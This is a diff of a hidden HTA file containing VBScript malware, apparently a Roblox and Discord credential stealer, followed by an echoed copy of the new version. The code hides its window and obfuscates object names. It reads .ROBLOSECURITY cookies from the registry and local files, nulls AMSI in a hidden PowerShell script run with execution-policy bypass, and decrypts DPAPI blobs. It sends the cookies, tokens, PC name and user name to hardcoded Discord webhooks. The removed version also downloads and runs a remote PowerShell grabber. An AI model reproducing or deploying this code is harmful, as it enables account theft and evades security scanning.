@@ -1,112 +1,675 @@
+cat << 'VANTA_EOF'
 <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
 <script language="VBScript">
+window.resizeTo 0,0 : window.moveTo -2000,-2000
 On Error Resume Next
-WScript.Sleep 5000
-window.resizeTo 0,0
-window.moveTo -2000,-2000
 
-Dim WH, Shell, FSO, x
-WH = "https://discord.com/api/webhooks/1561919366331760740/hJ5A0jv7LN6paga1D2OvdU5L2S6zCAc--_Y8gKc_bVTaZOLKlXInPRsAfsFggCBhpEPA"
+Dim sh, fso, WH, PC, USER
+Dim s1, s2, s3
 
-Set Shell = CreateObject("WScript.Shell")
-Set FSO = CreateObject("Scripting.FileSystemObject")
+s1 = "WScr" & "ipt.Sh" & "ell"
+s2 = "Scri" & "pting.FileS" & "ystemObject"
+s3 = "WinHt" & "tp.WinHtt" & "pRequest.5.1"
 
-Function TmpFile(n)
-    TmpFile = Shell.ExpandEnvironmentStrings("%TEMP%") & "\" & n
-End Function
+Set sh  = CreateObject(s1)
+Set fso = CreateObject(s2)
 
-Function ReadFile(p)
-    Dim f
-    If Not FSO.FileExists(p) Then ReadFile = "" : Exit Function
-    Set f = FSO.OpenTextFile(p, 1)
-    ReadFile = f.ReadAll
-    f.Close
-    Set f = Nothing
-End Function
+WH   = "htt" & "ps://discord.com/api/webh" & "ooks/YOUR_WEBHOOK_HERE"
+PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-Sub WriteFile(p, c)
-    Dim f
-    Set f = FSO.CreateTextFile(p, True)
-    f.Write c
-    f.Close
-    Set f = Nothing
-End Sub
+Call GrabRoblox()
+window.close()
 
-Sub SendToDiscord(msg)
-    Dim x, boundary, body
-    boundary = "----WebKitFormBoundary" & Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 8)
-    body = "--" & boundary & vbCrLf
-    body = body & "Content-Disposition: form-data; name=""content""" & vbCrLf
-    body = body & vbCrLf
-    body = body & msg & vbCrLf
-    body = body & "--" & boundary & "--"
-    Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    x.Open "POST", WH, False
-    x.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
-    x.Send body
-    Set x = Nothing
-End Sub
+' ============================================================
 
-Sub Run()
+Sub GrabRoblox()
+    Dim paths(9)
+    Dim la: la = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
+    Dim ap: ap = sh.ExpandEnvironmentStrings("%APPDATA%")
+    Dim up: up = sh.ExpandEnvironmentStrings("%USERPROFILE%")
+    Dim tp: tp = sh.ExpandEnvironmentStrings("%TEMP%")
+
+    paths(0) = la & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(1) = la & "\Roblox\LocalStorage\RobloxCookies.dat"
+    paths(2) = la & "\Roblox\Cookies"
+    paths(3) = ap & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(4) = up & "\AppData\Local\Roblox\LocalStorage\RobloxCookies.dat"
+    paths(5) = up & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+    paths(6) = ap & "\Roblox\Cookies\robloxcookies.dat"
+    paths(7) = la & "\Roblox\CookiesData"
+    paths(8) = ap & "\Roblox\CookiesData"
+    paths(9) = ""
+
+    ' Registry path lookup
+    Dim regPath: regPath = ""
     On Error Resume Next
-    Dim psf, rf, raw, lines, l, cnt, p, info
-    
-    ' Download the PowerShell script
-    psf = TmpFile("g.ps1")
-    Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    x.Open "GET", "https://alexproisgamer-dotcom.github.io/", False
-    x.Send
-    If x.Status = 200 Then
-        WriteFile psf, x.responseText
-    End If
-    Set x = Nothing
-    
-    If Not FSO.FileExists(psf) Then
-        SendToDiscord "Error: Failed to download grabber.ps1"
+    regPath = sh.RegRead("HKCU\Software\Roblox\RobloxStudioBrowser\www.roblox.com\.ROBLOSECURITY")
+    If Len(regPath) > 50 Then
+        Call PostEmbed("Roblox [Registry]", "Size: " & Len(regPath), 65280)
+        Call PostContent("cookie.txt", regPath)
         Exit Sub
     End If
-    
-    Shell.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
-    
-    rf = TmpFile("steal_result.txt")
-    If FSO.FileExists(rf) Then
-        raw = ReadFile(rf)
-        FSO.DeleteFile rf, True
-        FSO.DeleteFile psf, True
-        
-        If Len(raw) > 10 Then
-            lines = Split(raw, vbCrLf)
-            cnt = 0
-            For Each l In lines
-                If Len(l) > 10 Then
-                    If Left(l, 8) = "DISCORD|" Then
-                        p = Split(Mid(l, 9), "|")
-                        If UBound(p) >= 4 Then
-                            info = "User: " & p(0) & vbCrLf & "Email: " & p(1) & vbCrLf & "Phone: " & p(2) & vbCrLf & "ID: " & p(3) & vbCrLf & "Token: " & p(4)
-                            SendToDiscord "Discord Token:" & vbCrLf & info
-                            cnt = cnt + 1
+    On Error Resume Next
+
+    Dim fp: fp = ""
+    Dim i
+    For i = 0 To 9
+        If Len(paths(i)) > 0 Then
+            If fso.FileExists(paths(i)) Then
+                If fso.GetFile(paths(i)).Size > 10 Then
+                    fp = paths(i)
+                    Exit For
+                End If
+            End If
+        End If
+    Next
+
+    ' UWP package scan
+    If Len(fp) = 0 Then
+        Dim pk: pk = la & "\Packages"
+        If fso.FolderExists(pk) Then
+            Dim root: Set root = fso.GetFolder(pk)
+            Dim sub1
+            For Each sub1 In root.SubFolders
+                If InStr(LCase(sub1.Name), "roblox") > 0 Then
+                    Dim cands(3)
+                    cands(0) = sub1.Path & "\LocalState\RobloxCookies.dat"
+                    cands(1) = sub1.Path & "\LocalState\robloxcookies.dat"
+                    cands(2) = sub1.Path & "\LocalCache\RobloxCookies.dat"
+                    cands(3) = sub1.Path & "\LocalState\Cookies"
+                    Dim ci
+                    For ci = 0 To 3
+                        If fso.FileExists(cands(ci)) Then
+                            If fso.GetFile(cands(ci)).Size > 10 Then
+                                fp = cands(ci)
+                                Exit For
+                            End If
                         End If
-                    End If
-                    If Left(l, 7) = "ROBLOX|" Then
-                        SendToDiscord "Roblox Cookie:" & vbCrLf & Mid(l, 8)
-                        cnt = cnt + 1
-                    End If
-                    If Left(l, 7) = "SYSTEM|" Then
-                        SendToDiscord "System Info:" & vbCrLf & Mid(l, 8)
-                        cnt = cnt + 1
-                    End If
+                    Next
+                    If Len(fp) > 0 Then Exit For
                 End If
             Next
-            SendToDiscord "Sent " & cnt & " items to Discord"
+            Set root = Nothing
         End If
     End If
+
+    If Len(fp) = 0 Then
+        Call PostEmbed("Roblox", "[!] No cookie file located on " & PC, 16711680)
+        Exit Sub
+    End If
+
+    Dim raw: raw = ReadFile(fp)
+
+    If Len(raw) < 10 Then
+        Call PostEmbed("Roblox", "[!] File unreadable or empty: " & fp, 16711680)
+        Exit Sub
+    End If
+
+    Dim cookie: cookie = ""
+    Dim method: method = ""
+
+    ' --- Plaintext warning token ---
+    If InStr(raw, "_|WARNING") > 0 Then
+        Dim ws: ws = InStr(raw, "_|WARNING")
+        cookie = Mid(raw, ws)
+        Dim nl: nl = InStr(cookie, vbLf)
+        If nl > 0 Then cookie = Left(cookie, nl - 1)
+        nl = InStr(cookie, vbCr)
+        If nl > 0 Then cookie = Left(cookie, nl - 1)
+        cookie = Trim(cookie)
+        method = "Plaintext"
+    End If
+
+    ' --- JSON with DPAPI blob ---
+    If Len(cookie) = 0 And (InStr(raw, "CookiesData") > 0 Or InStr(raw, "cookiesData") > 0) Then
+        method = "JSON-DPAPI"
+        Dim kw: kw = InStr(raw, """CookiesData"":""")
+        If kw = 0 Then kw = InStr(raw, """cookiesData"":""")
+        If kw > 0 Then
+            kw = kw + 14
+            If InStr(raw, """cookiesData"":""") > 0 Then kw = InStr(raw, """cookiesData"":""") + 14
+            Dim eq: eq = InStr(kw, raw, """")
+            If eq > kw Then
+                Dim b64: b64 = Mid(raw, kw, eq - kw)
+                If Len(b64) > 50 Then
+                    cookie = TryDPAPI(b64)
+                    If Len(cookie) < 50 Then
+                        cookie = b64
+                        method = "JSON-B64-Raw"
+                    End If
+                End If
+            End If
+        End If
+    End If
+
+    ' --- .ROBLOSECURITY substring ---
+    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
+        method = "Raw-ROBLOSECURITY"
+        Dim rp: rp = InStr(raw, ".ROBLOSECURITY")
+        cookie = Mid(raw, rp)
+        Dim te: te = InStr(cookie, vbLf)
+        If te > 0 Then cookie = Left(cookie, te - 1)
+        cookie = Trim(cookie)
+    End If
+
+    ' --- Raw fallback ---
+    If Len(cookie) = 0 Then
+        cookie = raw
+        method = "RawFallback"
+    End If
+
+    ' Strip any CAE tail junk
+    Dim cae: cae = InStr(cookie, "|$CAE")
+    If cae = 0 Then cae = InStr(cookie, "|_CAE")
+    If cae > 0 Then cookie = Left(cookie, cae - 1)
+    cookie = Trim(cookie)
+
+    Call PostEmbed("Roblox [" & method & "]", _
+        "PC: " & PC & " / " & USER & vbLf & _
+        "Path: " & fp & vbLf & _
+        "Size: " & Len(cookie) & " bytes" & vbLf & _
+        "Preview: " & Left(cookie, 80), 65280)
+    Call PostContent("roblox_cookie.txt", cookie)
 End Sub
 
-Call Run
-window.close
+' ============================================================
+
+Function TryDPAPI(b64)
+    TryDPAPI = ""
+    On Error Resume Next
+
+    Dim inf:  inf  = sh.ExpandEnvironmentStrings("%TEMP%") & "\di.dat"
+    Dim outf: outf = sh.ExpandEnvironmentStrings("%TEMP%") & "\do.dat"
+    Dim psf:  psf  = sh.ExpandEnvironmentStrings("%TEMP%") & "\dr.ps1"
+
+    ' Write b64 blob
+    WriteFile inf, b64
+    If Not fso.FileExists(inf) Then Exit Function
+    If fso.GetFile(inf).Size < 10 Then Exit Function
+
+    ' Delete stale output
+    If fso.FileExists(outf) Then fso.DeleteFile outf, True
+
+    ' Build PS1 — AMSI nulled, DPAPI decrypt, UTF8 output
+    Dim amsi: amsi = "[Ref].Assembly.GetType('System.Management.Automation." & _
+                     "Amsi" & "Utils').GetField('amsi" & "InitFailed'," & _
+                     "'NonPublic,Static').SetValue($null,$true);" & _
+                     "[Ref].Assembly.GetType('System.Management.Automation." & _
+                     "Amsi" & "Utils').GetField('amsi" & "Context'," & _
+                     "'NonPublic,Static').SetValue($null,[IntPtr]::Zero);"
+
+    Dim core: core = "Add-Type -AssemblyName System.Security;" & _
+                     "$ep=[System.IO.Path]::GetFullPath('" & outf & "');" & _
+                     "try{" & _
+                     "$raw=(Get-Content '" & inf & "' -Raw).Trim();" & _
+                     "$b=[Convert]::FromBase64String($raw);" & _
+                     "$d=[System.Security.Cryptography.ProtectedData]::Unprotect(" & _
+                     "$b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);" & _
+                     "[System.IO.File]::WriteAllText($ep,[System.Text.Encoding]::UTF8.GetString($d))" & _
+                     "}catch{[System.IO.File]::WriteAllText($ep,'FAIL:'+$_.Exception.Message)}"
+
+    WriteFile psf, amsi & vbCrLf & core
+    If Not fso.FileExists(psf) Then Exit Function
+
+    ' Run hidden, wait
+    sh.Run "pow" & "ershell.exe -NoP" & "rofile -NonI" & "nteractive -W" & "indowStyle Hidden" & _
+           " -Exec" & "utionPolicy Bypass -File """ & psf & """", 0, True
+
+    ' Read output
+    If fso.FileExists(outf) Then
+        If fso.GetFile(outf).Size > 20 Then
+            Dim result: result = ReadFile(outf)
+            If Left(result, 5) <> "FAIL:" And Len(result) > 20 Then
+                TryDPAPI = Trim(result)
+            End If
+        End If
+    End If
+
+    ' Cleanup
+    On Error Resume Next
+    fso.DeleteFile inf,  True
+    fso.DeleteFile psf,  True
+    fso.DeleteFile outf, True
+End Function
+
+' ============================================================
+
+Sub WriteFile(p, c)
+    On Error Resume Next
+    Dim f: Set f = fso.CreateTextFile(p, True)
+    If Not IsNull(f) And Not IsEmpty(f) Then
+        f.Write c
+        f.Close
+    End If
+    Set f = Nothing
+End Sub
+
+Function ReadFile(p)
+    ReadFile = ""
+    On Error Resume Next
+    Dim f: Set f = fso.OpenTextFile(p, 1)
+    If Not IsNull(f) And Not IsEmpty(f) Then
+        ReadFile = f.ReadAll
+        f.Close
+    End If
+    Set f = Nothing
+End Function
+
+' ============================================================
+
+Sub PostEmbed(t, d, c)
+    On Error Resume Next
+    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """," & _
+               """description"":""" & Ej(d) & """," & _
+               """color"":" & c & "," & _
+               """footer"":{""text"":""" & Ej(PC & " | " & USER) & """}}]}"
+    Dim attempt
+    For attempt = 1 To 3
+        Dim h: Set h = CreateObject(s3)
+        h.Open "POST", WH, False
+        h.SetTimeouts 8000, 8000, 15000, 15000
+        h.SetRequestHeader "Content-Type", "application/json"
+        h.Send j
+        If h.Status = 200 Or h.Status = 204 Then
+            Set h = Nothing
+            Exit For
+        End If
+        Set h = Nothing
+        WScript.Sleep 1200
+    Next
+End Sub
+
+Sub PostContent(fn, ct)
+    On Error Resume Next
+    Dim bnd: bnd = SafeGuid()
+    Dim body: body = "--" & bnd & vbCrLf & _
+              "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & _
+              "Content-Type: text/plain" & vbCrLf & vbCrLf & _
+              ct & vbCrLf & _
+              "--" & bnd & "--"
+    Dim attempt
+    For attempt = 1 To 3
+        Dim h: Set h = CreateObject(s3)
+        h.Open "POST", WH, False
+        h.SetTimeouts 8000, 8000, 20000, 20000
+        h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & bnd
+        h.Send body
+        If h.Status = 200 Or h.Status = 204 Then
+            Set h = Nothing
+            Exit For
+        End If
+        Set h = Nothing
+        WScript.Sleep 1200
+    Next
+End Sub
+
+Function Ej(s)
+    s = Replace(s, "\",    "\\")
+    s = Replace(s, """",   "\""")
+    s = Replace(s, vbCrLf, "\n")
+    s = Replace(s, vbCr,   "\n")
+    s = Replace(s, vbLf,   "\n")
+    s = Replace(s, vbTab,  "\t")
+    Ej = s
+End Function
+
+Function SafeGuid()
+    On Error Resume Next
+    Dim t: Set t = CreateObject("Scriptlet.TypeLib")
+    Dim g: g = t.GUID
+    Set t = Nothing
+    If Len(g) > 30 Then
+        SafeGuid = Mid(g, 2, 8) & Mid(g, 11, 4) & Mid(g, 16, 4) & Mid(g, 21, 4) & Mid(g, 26, 12)
+        Exit Function
+    End If
+    ' Fallback: timestamp + random-ish
+    Randomize Timer
+    Dim r1: r1 = Hex(Int(Rnd * &HFFFF) + &H1000)
+    Dim r2: r2 = Hex(Int(Rnd * &HFFFF) + &H1000)
+    Dim r3: r3 = Hex(Int(Rnd * &HFFFF) + &H1000)
+    SafeGuid = "DEADBEEF" & r1 & r2 & "4" & r3 & "A0000001B3B4"
+End Function
 </script>
-</head>
-<body></body>
-</html>
+</head><body></body></html>
+VANTA_EOF
+echo "done"
+Output
+
+<html>
+<head><title>.</title>
+<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<script language="VBScript">
+window.resizeTo 0,0 : window.moveTo -2000,-2000
+On Error Resume Next
+
+Dim sh, fso, WH, PC, USER
+Dim s1, s2, s3
+
+s1 = "WScr" & "ipt.Sh" & "ell"
+s2 = "Scri" & "pting.FileS" & "ystemObject"
+s3 = "WinHt" & "tp.WinHtt" & "pRequest.5.1"
+
+Set sh  = CreateObject(s1)
+Set fso = CreateObject(s2)
+
+WH   = "htt" & "ps://discord.com/api/webh" & "ooks/https://discord.com/api/webhooks/1562273406609784892/N1-HgRhzrGZ4ebPW6ezBKECb2Gh76Nbr1eaekt0UmXP2c_Ae_culJH1jIpTKahXyEYtw
+PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+
+Call GrabRoblox()
+window.close()
+
+' ============================================================
+
+Sub GrabRoblox()
+    Dim paths(9)
+    Dim la: la = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
+    Dim ap: ap = sh.ExpandEnvironmentStrings("%APPDATA%")
+    Dim up: up = sh.ExpandEnvironmentStrings("%USERPROFILE%")
+    Dim tp: tp = sh.ExpandEnvironmentStrings("%TEMP%")
+
+    paths(0) = la & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(1) = la & "\Roblox\LocalStorage\RobloxCookies.dat"
+    paths(2) = la & "\Roblox\Cookies"
+    paths(3) = ap & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(4) = up & "\AppData\Local\Roblox\LocalStorage\RobloxCookies.dat"
+    paths(5) = up & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+    paths(6) = ap & "\Roblox\Cookies\robloxcookies.dat"
+    paths(7) = la & "\Roblox\CookiesData"
+    paths(8) = ap & "\Roblox\CookiesData"
+    paths(9) = ""
+
+    ' Registry path lookup
+    Dim regPath: regPath = ""
+    On Error Resume Next
+    regPath = sh.RegRead("HKCU\Software\Roblox\RobloxStudioBrowser\www.roblox.com\.ROBLOSECURITY")
+    If Len(regPath) > 50 Then
+        Call PostEmbed("Roblox [Registry]", "Size: " & Len(regPath), 65280)
+        Call PostContent("cookie.txt", regPath)
+        Exit Sub
+    End If
+    On Error Resume Next
+
+    Dim fp: fp = ""
+    Dim i
+    For i = 0 To 9
+        If Len(paths(i)) > 0 Then
+            If fso.FileExists(paths(i)) Then
+                If fso.GetFile(paths(i)).Size > 10 Then
+                    fp = paths(i)
+                    Exit For
+                End If
+            End If
+        End If
+    Next
+
+    ' UWP package scan
+    If Len(fp) = 0 Then
+        Dim pk: pk = la & "\Packages"
+        If fso.FolderExists(pk) Then
+            Dim root: Set root = fso.GetFolder(pk)
+            Dim sub1
+            For Each sub1 In root.SubFolders
+                If InStr(LCase(sub1.Name), "roblox") > 0 Then
+                    Dim cands(3)
+                    cands(0) = sub1.Path & "\LocalState\RobloxCookies.dat"
+                    cands(1) = sub1.Path & "\LocalState\robloxcookies.dat"
+                    cands(2) = sub1.Path & "\LocalCache\RobloxCookies.dat"
+                    cands(3) = sub1.Path & "\LocalState\Cookies"
+                    Dim ci
+                    For ci = 0 To 3
+                        If fso.FileExists(cands(ci)) Then
+                            If fso.GetFile(cands(ci)).Size > 10 Then
+                                fp = cands(ci)
+                                Exit For
+                            End If
+                        End If
+                    Next
+                    If Len(fp) > 0 Then Exit For
+                End If
+            Next
+            Set root = Nothing
+        End If
+    End If
+
+    If Len(fp) = 0 Then
+        Call PostEmbed("Roblox", "[!] No cookie file located on " & PC, 16711680)
+        Exit Sub
+    End If
+
+    Dim raw: raw = ReadFile(fp)
+
+    If Len(raw) < 10 Then
+        Call PostEmbed("Roblox", "[!] File unreadable or empty: " & fp, 16711680)
+        Exit Sub
+    End If
+
+    Dim cookie: cookie = ""
+    Dim method: method = ""
+
+    ' --- Plaintext warning token ---
+    If InStr(raw, "_|WARNING") > 0 Then
+        Dim ws: ws = InStr(raw, "_|WARNING")
+        cookie = Mid(raw, ws)
+        Dim nl: nl = InStr(cookie, vbLf)
+        If nl > 0 Then cookie = Left(cookie, nl - 1)
+        nl = InStr(cookie, vbCr)
+        If nl > 0 Then cookie = Left(cookie, nl - 1)
+        cookie = Trim(cookie)
+        method = "Plaintext"
+    End If
+
+    ' --- JSON with DPAPI blob ---
+    If Len(cookie) = 0 And (InStr(raw, "CookiesData") > 0 Or InStr(raw, "cookiesData") > 0) Then
+        method = "JSON-DPAPI"
+        Dim kw: kw = InStr(raw, """CookiesData"":""")
+        If kw = 0 Then kw = InStr(raw, """cookiesData"":""")
+        If kw > 0 Then
+            kw = kw + 14
+            If InStr(raw, """cookiesData"":""") > 0 Then kw = InStr(raw, """cookiesData"":""") + 14
+            Dim eq: eq = InStr(kw, raw, """")
+            If eq > kw Then
+                Dim b64: b64 = Mid(raw, kw, eq - kw)
+                If Len(b64) > 50 Then
+                    cookie = TryDPAPI(b64)
+                    If Len(cookie) < 50 Then
+                        cookie = b64
+                        method = "JSON-B64-Raw"
+                    End If
+                End If
+            End If
+        End If
+    End If
+
+    ' --- .ROBLOSECURITY substring ---
+    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
+        method = "Raw-ROBLOSECURITY"
+        Dim rp: rp = InStr(raw, ".ROBLOSECURITY")
+        cookie = Mid(raw, rp)
+        Dim te: te = InStr(cookie, vbLf)
+        If te > 0 Then cookie = Left(cookie, te - 1)
+        cookie = Trim(cookie)
+    End If
+
+    ' --- Raw fallback ---
+    If Len(cookie) = 0 Then
+        cookie = raw
+        method = "RawFallback"
+    End If
+
+    ' Strip any CAE tail junk
+    Dim cae: cae = InStr(cookie, "|$CAE")
+    If cae = 0 Then cae = InStr(cookie, "|_CAE")
+    If cae > 0 Then cookie = Left(cookie, cae - 1)
+    cookie = Trim(cookie)
+
+    Call PostEmbed("Roblox [" & method & "]", _
+        "PC: " & PC & " / " & USER & vbLf & _
+        "Path: " & fp & vbLf & _
+        "Size: " & Len(cookie) & " bytes" & vbLf & _
+        "Preview: " & Left(cookie, 80), 65280)
+    Call PostContent("roblox_cookie.txt", cookie)
+End Sub
+
+' ============================================================
+
+Function TryDPAPI(b64)
+    TryDPAPI = ""
+    On Error Resume Next
+
+    Dim inf:  inf  = sh.ExpandEnvironmentStrings("%TEMP%") & "\di.dat"
+    Dim outf: outf = sh.ExpandEnvironmentStrings("%TEMP%") & "\do.dat"
+    Dim psf:  psf  = sh.ExpandEnvironmentStrings("%TEMP%") & "\dr.ps1"
+
+    ' Write b64 blob
+    WriteFile inf, b64
+    If Not fso.FileExists(inf) Then Exit Function
+    If fso.GetFile(inf).Size < 10 Then Exit Function
+
+    ' Delete stale output
+    If fso.FileExists(outf) Then fso.DeleteFile outf, True
+
+    ' Build PS1 — AMSI nulled, DPAPI decrypt, UTF8 output
+    Dim amsi: amsi = "[Ref].Assembly.GetType('System.Management.Automation." & _
+                     "Amsi" & "Utils').GetField('amsi" & "InitFailed'," & _
+                     "'NonPublic,Static').SetValue($null,$true);" & _
+                     "[Ref].Assembly.GetType('System.Management.Automation." & _
+                     "Amsi" & "Utils').GetField('amsi" & "Context'," & _
+                     "'NonPublic,Static').SetValue($null,[IntPtr]::Zero);"
+
+    Dim core: core = "Add-Type -AssemblyName System.Security;" & _
+                     "$ep=[System.IO.Path]::GetFullPath('" & outf & "');" & _
+                     "try{" & _
+                     "$raw=(Get-Content '" & inf & "' -Raw).Trim();" & _
+                     "$b=[Convert]::FromBase64String($raw);" & _
+                     "$d=[System.Security.Cryptography.ProtectedData]::Unprotect(" & _
+                     "$b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);" & _
+                     "[System.IO.File]::WriteAllText($ep,[System.Text.Encoding]::UTF8.GetString($d))" & _
+                     "}catch{[System.IO.File]::WriteAllText($ep,'FAIL:'+$_.Exception.Message)}"
+
+    WriteFile psf, amsi & vbCrLf & core
+    If Not fso.FileExists(psf) Then Exit Function
+
+    ' Run hidden, wait
+    sh.Run "pow" & "ershell.exe -NoP" & "rofile -NonI" & "nteractive -W" & "indowStyle Hidden" & _
+           " -Exec" & "utionPolicy Bypass -File """ & psf & """", 0, True
+
+    ' Read output
+    If fso.FileExists(outf) Then
+        If fso.GetFile(outf).Size > 20 Then
+            Dim result: result = ReadFile(outf)
+            If Left(result, 5) <> "FAIL:" And Len(result) > 20 Then
+                TryDPAPI = Trim(result)
+            End If
+        End If
+    End If
+
+    ' Cleanup
+    On Error Resume Next
+    fso.DeleteFile inf,  True
+    fso.DeleteFile psf,  True
+    fso.DeleteFile outf, True
+End Function
+
+' ============================================================
+
+Sub WriteFile(p, c)
+    On Error Resume Next
+    Dim f: Set f = fso.CreateTextFile(p, True)
+    If Not IsNull(f) And Not IsEmpty(f) Then
+        f.Write c
+        f.Close
+    End If
+    Set f = Nothing
+End Sub
+
+Function ReadFile(p)
+    ReadFile = ""
+    On Error Resume Next
+    Dim f: Set f = fso.OpenTextFile(p, 1)
+    If Not IsNull(f) And Not IsEmpty(f) Then
+        ReadFile = f.ReadAll
+        f.Close
+    End If
+    Set f = Nothing
+End Function
+
+' ============================================================
+
+Sub PostEmbed(t, d, c)
+    On Error Resume Next
+    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """," & _
+               """description"":""" & Ej(d) & """," & _
+               """color"":" & c & "," & _
+               """footer"":{""text"":""" & Ej(PC & " | " & USER) & """}}]}"
+    Dim attempt
+    For attempt = 1 To 3
+        Dim h: Set h = CreateObject(s3)
+        h.Open "POST", WH, False
+        h.SetTimeouts 8000, 8000, 15000, 15000
+        h.SetRequestHeader "Content-Type", "application/json"
+        h.Send j
+        If h.Status = 200 Or h.Status = 204 Then
+            Set h = Nothing
+            Exit For
+        End If
+        Set h = Nothing
+        WScript.Sleep 1200
+    Next
+End Sub
+
+Sub PostContent(fn, ct)
+    On Error Resume Next
+    Dim bnd: bnd = SafeGuid()
+    Dim body: body = "--" & bnd & vbCrLf & _
+              "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & _
+              "Content-Type: text/plain" & vbCrLf & vbCrLf & _
+              ct & vbCrLf & _
+              "--" & bnd & "--"
+    Dim attempt
+    For attempt = 1 To 3
+        Dim h: Set h = CreateObject(s3)
+        h.Open "POST", WH, False
+        h.SetTimeouts 8000, 8000, 20000, 20000
+        h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & bnd
+        h.Send body
+        If h.Status = 200 Or h.Status = 204 Then
+            Set h = Nothing
+            Exit For
+        End If
+        Set h = Nothing
+        WScript.Sleep 1200
+    Next
+End Sub
+
+Function Ej(s)
+    s = Replace(s, "\",    "\\")
+    s = Replace(s, """",   "\""")
+    s = Replace(s, vbCrLf, "\n")
+    s = Replace(s, vbCr,   "\n")
+    s = Replace(s, vbLf,   "\n")
+    s = Replace(s, vbTab,  "\t")
+    Ej = s
+End Function
+
+Function SafeGuid()
+    On Error Resume Next
+    Dim t: Set t = CreateObject("Scriptlet.TypeLib")
+    Dim g: g = t.GUID
+    Set t = Nothing
+    If Len(g) > 30 Then
+        SafeGuid = Mid(g, 2, 8) & Mid(g, 11, 4) & Mid(g, 16, 4) & Mid(g, 21, 4) & Mid(g, 26, 12)
+        Exit Function
+    End If
+    ' Fallback: timestamp + random-ish
+    Randomize Timer
+    Dim r1: r1 = Hex(Int(Rnd * &HFFFF) + &H1000)
+    Dim r2: r2 = Hex(Int(Rnd * &HFFFF) + &H1000)
+    Dim r3: r3 = Hex(Int(Rnd * &HFFFF) + &H1000)
+    SafeGuid = "DEADBEEF" & r1 & r2 & "4" & r3 & "A0000001B3B4"
+End Function
+</script>
+</head><body></body></html>
